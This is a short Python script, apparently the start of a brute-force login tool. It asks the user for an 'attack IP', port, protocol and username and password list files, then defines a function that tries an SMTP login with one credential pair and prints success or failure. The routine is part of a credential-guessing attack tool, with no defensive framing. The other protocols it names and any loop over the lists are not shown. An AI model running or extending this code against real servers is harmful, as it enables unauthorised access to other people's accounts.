# -*- coding: utf-8 -*-
"""
Created on Sun Jun 22 15:40:51 2025

@author: mayuk
"""

import time
import smtplib

start_time = time.time()

target_ip = input("Enter attack IP: ")
target_port = int(input("Enter port no.: "))
protocol = input("Enter protocol type (ssh/ftp/http/smtp): ").lower()
username_file = input("Enter your username file: ")
password_file = input("Enter your password file: ")
timeout_seconds = int(input("Enter your time (seconds): "))

# SMTP Login 
def try_smtp_login(host, port, username, password):
    try:
        server = smtplib.SMTP(host=host, port=port, timeout=timeout_seconds)
        server.ehlo()
        server.starttls()
        server.login(username, password)
        print(f"[SMTP SUCCESS📧] {username}:{password}")
        server.quit()
        return True
    except smtplib.SMTPAuthenticationError:
        print(f"[SMTP FAIL❌] {username}:{password}")
    except Exception as e:
        print(f"[SMTP ERROR😵] {e}")
    return False